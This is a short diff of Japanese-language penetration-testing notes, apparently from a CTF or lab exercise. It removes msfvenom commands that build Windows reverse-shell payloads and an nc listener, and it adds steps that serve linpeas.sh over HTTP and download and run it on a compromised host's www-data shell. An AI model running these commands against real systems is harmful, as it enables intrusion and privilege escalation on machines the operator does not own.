@@ -13,9 +13,11 @@ sudo ip link set dev tun0 mtu 1200
 
 
 
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.xxx.xxx LPORT=4444 -f aspx -o shell.aspx
+# HTTP サーバーを起動
+python3 -m http.server 8080
 
-msfvenom -p windows/shell_reverse_tcp LHOST=10.10.xxx.xxx LPORT=4444 -f exe -o shell2.exe
-
-nc -lvnp 4444
-
+被害マシン（www-data のシェル）から取得：
+bashcd /tmp
+wget http://10.10.16.166:8080/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
